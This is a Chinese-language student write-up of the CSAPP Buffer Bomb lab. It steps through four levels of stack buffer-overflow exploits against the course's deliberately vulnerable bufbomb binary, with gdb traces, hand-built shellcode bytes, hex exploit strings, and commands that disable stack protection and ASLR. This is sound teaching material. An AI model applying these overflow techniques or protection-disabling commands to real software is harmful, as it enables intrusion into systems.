##	实验说明

*	实验名称

	Lab3: The Buffer Bomb, 缓冲区溢出炸弹

*	实验环境

	*	Ubuntu 16.04
	*	gdb 7.11.1
	*	gcc 5.4.0
	*	objdump 2.26.1

*	实验目的

	掌握函数调用时的栈帧结构

	利用输入缓冲区的溢出漏洞，将攻击代码嵌入当前程序的栈帧中，使得程序执行我们所期望的过程

*	实验程序

	解压文件，得到三个文件

	*	makecookie, 生成cookie

	*	sendstring, 字符格式转换

	*	bufbomb, 可执行程序-攻击对象

		Bufbomb中包含一个getbuf函数，该函数实现如下

		```c
		int getbuf() { 
			char buf[12]; 
			Gets(buf); 
			return 1; 
		}
		```

		对buf没有越界检查（常见c编程错误）

		超过11个字符将溢出

		溢出

		溢出的字符将覆盖栈帧上的数据

		特别的，会覆盖程序调用的返回地址

		赋予我们控制程序流程的能力

		通过构造溢出字符串，程序将“返回”至我们想要的代码上

	<br>

##	准备过程

*	首先按照要求, 生成小组名对应的 `Cookie`

	我们小组的三位同学的学号分别是 `SA18225263`, `SA18225419`, `SA18225037`, 通过命令 `makecookie`

	```
	./makecookie SA18225263+SA18225419+SA18225037
	Cookie: 0x5fb97de9
	```

	可以得到我们小组的 `Cookie=0x5fb97de9`

*	生成反汇编代码, 并保存在 `bufbomb.s` 文件中

	```bash
	objdump -D bufbomb > bufbomb.s
	```

*	将字符串形式的输入转换为字面意义的ASCII码

	先创建一个文本文件 `exploit.txt`, 写入如下字符串(十六进制的 `0x31`, 在 `ASCII` 中表示 `1`)

	```
	31 32 33 34
	```

	然后使用工具 `sendstring`

	```
	./sendstring < exploit.txt > exploit-raw.txt
	```

	即可得到新的文本文件 `exploit-raw.txt`, 其内容是

	```
	1234
	```

*	测试

	为了区分不同的小组, 我们要加上参数 `-t SA18225263+SA18225419+SA18225037`

	接着, 将刚才生成的 `exploit-raw.txt` 的内容作为输入, 写到 `buf` 中去

	```
	./bufbomb -t SA18225263+SA18225419+SA18225037 < exploit-raw.txt
	Team: SA18225263+SA18225419+SA18225037
	Cookie: 0x5fb97de9
	Type string:Dud: getbuf returned 0x1
	Better luck next time
	```

##	实验过程

*	本次实验利用 `Gets()` 函数不检查输入字符串长度的漏洞, 破坏 `getbuf()` 的 `return address` 从而达到对主程序造成破坏的目的。

	`getbuf()` 的反汇编代码如下

	```asm
	08048fe0 <getbuf>:
	 8048fe0:	55                   	push   %ebp
	 8048fe1:	89 e5                	mov    %esp,%ebp
	 8048fe3:	83 ec 18             	sub    $0x18,%esp
	 8048fe6:	8d 45 f4             	lea    -0xc(%ebp),%eax
	 8048fe9:	89 04 24             	mov    %eax,(%esp)
	 8048fec:	e8 6f fe ff ff       	call   8048e60 <Gets>
	 8048ff1:	b8 01 00 00 00       	mov    $0x1,%eax
	 8048ff6:	c9                   	leave  
	 8048ff7:	c3                   	ret    
	 8048ff8:	90                   	nop
	 8048ff9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
	```

*	Level0: Candle

	本题要求我们通过缓冲区溢出, 将 `getbuf()` 的返回地址定向到 `smoke()` 的起点, 从而执行 `smoke()` 函数

	栈帧结构如下

	![stack frame](https://github.com/jJayyyyyyy/USTC-2018-Smester-1/blob/master/CSAPP/exp/lab03/assets/stack_frame.png)

	通过分析 `getbuf()` 我们可以发现, `buf` 的起始地址为 `0xffffba2c`, 长度为 `0x0c`, 即 `12字节`, `getbuf()` 的返回地址保存在 `$ebp+0x04` 的地方, 值是 `0x0804901e`, 即 `test()` 中调用 `getbuf()` 后的下一条指令的地址

	```bash
	$ gdb bufbomb
	(gdb)
	set args -t SA18225263+SA18225419+SA18225037 < exploit-raw.txt
	break *0x8048fe0
	break *0x8048fe9
	break *0x8048ff1
	run

	Breakpoint 1, 0x08048fe0 in getbuf ()
	(gdb) x/x $ebp
	0xffffba58:     0xffffd5e8

	...
	0x08048fec in getbuf ()
	(gdb) x/x $ebp+0x04
	0xffffba3c:     0x0804901e
	(gdb) x/x $ebp
	0xffffba38:     0xffffba58

	(gdb) x/x $ebp-0x0c
	0xffffba2c:     0x00000000
	(gdb) x/x $esp
	0xffffba20:     0xffffba2c
	```

	于是我们的目标是, 构造 `exploit-raw.txt`, 将其写入 `buf`, 修改返回地址, 使其指向 `smoke()` 的入口地址

	通过查看 `bufbomb.s` 我们可以知道 `smoke()` 的入口地址是 `0x08048e20`

	因此我们可以构造如下的 `exploit.txt`

	> 00 00 00 00 00 00 00 00 00 00 00 00 58 ba ff ff 20 8e 04 08

	然后我们用 `sendstring` 将其转为 `exploit-raw.txt`

	```$
	$ ./sendstring < exploit.txt > exploit-raw.txt
	$ xxd exploit-raw.txt
	00000000: 0000 0000 0000 0000 0000 0000 38ba ffff  ................
	00000010: 208e 0408 0a                              ....
	```

	内容一共 20 个字节, 第一组是前 12 个字节, 内容是填充到 `buf` 的无用字节, 第二组是接下来的 4 个字节, 写入 `R[%ebp]` 原来的数据, 第三组是最后 4 个字节, 写的是 `smoke()` 的入口地址。这样 `getbuf()` 结束以后, 就会进入 `smoke()`.

	综上, 第1题的 `exploit-raw.txt` 为

	```$
	$ xxd exploit-raw.txt
	00000000: 0000 0000 0000 0000 0000 0000 38ba ffff  ................
	00000010: 208e 0408 0a                              ....
	```

	注1: 其实第二组的四个字节可以不用写入 `R[%ebp]` 原来的数据, 因为在执行完 `smoke()` 之后, 直接就调用了 `exit()` 退出程序了, 所以不需要维护原来的栈结构。

	<br>

*	Level1: Sparkler

	本题要求我们通过缓冲区溢出改变进程走向, 进入 `void fizz(int val)` 函数, 同时还要传递参数, 使 `val==cookie`, 

	我们先观察一下 `void fizz(int val)` 的反汇编代码

	```asm
	08048dc0 <fizz>:
	 8048dc0:	55                   	push   %ebp

	 # $esp 此时指向 上一轮的返回地址, 即 $saved_ebp+4, 其内容 M[] 是我们通过缓冲区溢出写入的
	 # $ebp = $esp
	 8048dc1:	89 e5                	mov    %esp,%ebp


	 8048dc3:	53                   	push   %ebx
	 8048dc4:	83 ec 14             	sub    $0x14,%esp

	 # $ebx = M[$ebp+0x08], 即上一轮的返回地址还要向上 +8 的位置
	 8048dc7:	8b 5d 08             	mov    0x8(%ebp),%ebx
	 8048dca:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
	 8048dd1:	e8 ca fb ff ff       	call   80489a0 <entry_check>
	 8048dd6:	3b 1d cc a1 04 08    	cmp    0x804a1cc,%ebx
	 8048ddc:	74 22                	je     8048e00 <fizz+0x40>
	 8048dde:	89 5c 24 04          	mov    %ebx,0x4(%esp)
	 8048de2:	c7 04 24 98 98 04 08 	movl   $0x8049898,(%esp)
	 8048de9:	e8 76 f9 ff ff       	call   8048764 <printf@plt>
	 8048dee:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
	 8048df5:	e8 aa f9 ff ff       	call   80487a4 <exit@plt>
	 8048dfa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
	 8048e00:	89 5c 24 04          	mov    %ebx,0x4(%esp)
	 8048e04:	c7 04 24 29 9a 04 08 	movl   $0x8049a29,(%esp)
	 8048e0b:	e8 54 f9 ff ff       	call   8048764 <printf@plt>
	 8048e10:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
	 8048e17:	e8 c4 fc ff ff       	call   8048ae0 <validate>
	 8048e1c:	eb d0                	jmp    8048dee <fizz+0x2e>
	 8048e1e:	89 f6                	mov    %esi,%esi
	```

	首先我们还是通过老办法, 修改返回地址, 从而进入 `fizz()`, 并在入口处设置断点 `b *0x08048dc0`

	```
	# test_Sparkler
	00 00 00 00 00 00 00 00 00 00 00 00 58 ba ff ff c0 8d 04 08
	```

	此时观察一下 `$esp`

	```
	Breakpoint 1, 0x08048dc0 in fizz ()
	(gdb) x/x $esp
	0xffffba40:     0x00000000
	(gdb) si
	0x08048dc1 in fizz ()
	(gdb) x/x $esp
	0xffffba3c:     0xffffba38
	(gdb) si
	0x08048dc3 in fizz ()
	(gdb) x/x $esp
	0xffffba3c:     0xffffba38
	(gdb) x/x $ebp
	0xffffba3c:     0xffffba38
	```

	可以看出在执行完 `0x8048dc1` 处的 `mov    %esp,%ebp` 后, %ebp 其实指向了上一轮我们 return address 的地址, 即 `$saved_ebp+4`

	再向下可以看到 `0x8048de2` 处进行的比较是 `cmp    0x804a1cc,%ebx`, 即 `if (val == cookie)`, 而 `%ebp` 来自 `0x8(%ebp)`, 所以为了实现实验目的, 输出 `Fizz!: You called fizz(0x5fb97de9)`, 我们就要在 `$saved_ebp+4+8` 的地方写入我们小组的 `Cookie`

	> 00 00 00 00 00 00 00 00 00 00 00 00 58 ba ff ff c0 8d 04 08 00 00 00 00 e9 7d b9 5f

	也就是在刚才的 `test_Sparkler` 后面加上 `00 00 00 00 e9 7d b9 5f`

	最后, 我们测试一下实验结果

	```
	$ xxd exploit-raw.txt
	00000000: 0000 0000 0000 0000 0000 0000 38ba ffff  ............8...
	00000010: c08d 0408 0000 0000 e97d b95f 0a         .........}._.

	$ ./bufbomb -t SA18225263+SA18225419+SA18225037 < exploit-raw.txt
	Team: SA18225263+SA18225419+SA18225037
	Cookie: 0x5fb97de9
	Type string:Fizz!: You called fizz(0x5fb97de9)
	NICE JOB!
	Sent validation information to grading server
	```

	通过测试, 结果正确。综上, 第2题的 `exploit-raw.txt` 为

	```
	$ xxd exploit-raw.txt
	00000000: 0000 0000 0000 0000 0000 0000 38ba ffff  ............8...
	00000010: c08d 0408 0000 0000 e97d b95f 0a         .........}._.
	```

	<br>

*	Level2: Firecracker

	本题要求我们将返回地址写成 `buf` 的起始地址 `0xffffba2c`

	```
	Breakpoint 1, 0x08048fe9 in getbuf ()
	(gdb) x/x $ebp-0x0c
	0xffffba2c:     0x00000000
	```

	这样机器就会把我们写入缓冲区的数据当成指令来执行, 完成的功能如下

	*	把全局变量 `global_value` 的值设置为 `cookie` 的值, 即

		`global_value = 0x5fb97de9

	*	进入 `bang()` 函数

	在 `bufbomb.s` 中我们可以看到 `global_val` 的地址是 `0x0804a1dc`, `bang()` 的地址是 `0x08048d60`

	因此我们可以写出如下汇编代码, 并保存为文件 `bang.s`

	```asm
	movl $0x5fb97de9,0x0804a1dc
	push $0x08048d60
	ret
	```

	再用 `gcc -m32 -c bang.s` 得到 `bang.o`, 接着用 `objdump -d bang.o > bangobjdump.s` 得到 `bangobjdump.o`

	```asm
	bang.o:     file format elf32-i386

	Disassembly of section .text:

	00000000 <.text>:
	   0:   c7 05 dc a1 04 08 e9    movl   $0x5fb97de9,0x804a1dc
	   7:   7d b9 5f 
	   a:   68 60 8d 04 08          push   $0x8048d60
	   f:   c3                      ret
	```

	即我们写的汇编代码的机器码为 `c7 05 dc a1 04 08 e9 7d b9 5f 68 60 8d 04 08 c3`, 刚好 16 字节, 把这些内容写入 `exploit.txt`, 并再后面加上 `buf` 的起始地址 `2c ba ff ff`, 即

	> c7 05 dc a1 04 08 e9 7d b9 5f 68 60 8d 04 08 c3 2c ba ff ff

	最后生成的 `exploit-raw.txt` 为

	```
	$xxd exploit-raw.txt
	xxd exploit-raw.txt
	00000000: c705 dca1 0408 e97d b95f 6860 8d04 08c3  .......}._h`....
	00000010: 2cba ffff 0a                             ,....
	```

	测试一下结果

	```
	root@vultr:~# ./bufbomb -t SA18225263+SA18225419+SA18225037 < exploit-raw.txt
	Team: SA18225263+SA18225419+SA18225037
	Cookie: 0x5fb97de9
	Type string:Bang!: You set global_value to 0x5fb97de9
	NICE JOB!
	Sent validation information to grading server
	```

	需要注意的是, 处于安全考虑, `Ubuntu16.04` 不允许在栈上执行指令, 我们需要使用 `execstack` 工具加上执行权限, 同时关掉 `ASLR` (Address space layout randomization, 地址空间布局随机化), 否则会出现 `segmentation fault`

	```
	$ execstack -s bufbomb
	$ sysctl -w kernel.randomize_va_space=0
	```

	做下一题的时候也要用到上面两条命令。

*	Level3: Dynamite

	本题要求我们正常回到 `test()`, 但是将 `getbuf()` 的返回值设为我们的 `cookie=0x5fb97de9`, 同时维护好栈空间, 即要把 `$ebp` 写回原来的 `$saved_ebp`

	过程和上一题类似, 由于返回值保存在 `$eax` 中, 正常的返回地址是 `test()` 中的 `0x0804901e`, 所以我们可以写出如下汇编代码, 保存在 `dynamite.s` 中

	```asm
	movl $0x5fb97de9,%eax
	push $0x0804901e
	ret
	```

	接下来利用 `gcc` 和 `objdump` 得到机器码

	```
	$ gcc -m32 -c dynamite.s
	$ objdump -d dynamite.o > dynamiteobjdump.s
	$ cat dynamiteobjdump.s

	dynamite.o:     file format elf32-i386

	Disassembly of section .text:

	00000000 <.text>:
	   0:   b8 e9 7d b9 5f          mov    $0x5fb97de9,%eax
	   5:   68 1e 90 04 08          push   $0x804901e
	   a:   c3                      ret    
	```

	机器码一共 11 字节, 后面任意填充一个字节, 如 `00`, 然后写入 `$saved_ebp = 58 ba ff ff`, 最后将返回地址设置成 `buf` 的起始地址 `2c ba ff ff`

	> b8 e9 7d b9 5f 68 1e 90 04 08 c3 00 58 ba ff ff 2c ba ff ff

	<br>

##	实验结果截图

*	Level0: Candle

	exploit.txt

	> 00 00 00 00 00 00 00 00 00 00 00 00 58 ba ff ff 20 8e 04 08

	![candle](https://github.com/jJayyyyyyy/USTC-2018-Smester-1/blob/master/CSAPP/exp/lab03/assets/result1.png)

*	Level1: Sparkler

	exploit.txt

	> 00 00 00 00 00 00 00 00 00 00 00 00 58 ba ff ff c0 8d 04 08 00 00 00 00 e9 7d b9 5f

	![sparkler](https://github.com/jJayyyyyyy/USTC-2018-Smester-1/blob/master/CSAPP/exp/lab03/assets/result2.png)

*	Level2: Firecracker

	exploit.txt

	> c7 05 dc a1 04 08 e9 7d b9 5f 68 60 8d 04 08 c3 2c ba ff ff

	![firecracker](https://github.com/jJayyyyyyy/USTC-2018-Smester-1/blob/master/CSAPP/exp/lab03/assets/result3.png)

*	Level3: Dynamite

	exploit.txt

	> b8 e9 7d b9 5f 68 1e 90 04 08 c3 00 58 ba ff ff 2c ba ff ff

	![Dynamite](https://github.com/jJayyyyyyy/USTC-2018-Smester-1/blob/master/CSAPP/exp/lab03/assets/result4.png)

	<br>

##	参考资料

*	[实验三指导书](http://ssea.ustcsz.edu.cn:443/UploadFiles/experimentResources/20181102/%E5%AE%9E%E9%AA%8C%E4%B8%89%E6%8C%87%E5%AF%BC%E4%B9%A6_20151219101717168_2018112202849933.pdf)
*	[实验三简介](http://ssea.ustcsz.edu.cn:443/UploadFiles/experimentResources/20181102/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E4%B8%89%E7%AE%80%E4%BB%8B_2015121910173153_2018112202854158.ppt)
*	[Bufbomb缓冲区溢出攻击实验详解-CSAPP](https://www.jianshu.com/p/dc41c84cef17)
*	[CSAPP:bufbomb](https://zybuluo.com/windmelon/note/1334269)
*	[execstack, ASLR](https://blog.csdn.net/z1185196212/article/details/52960357)
*	[ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)
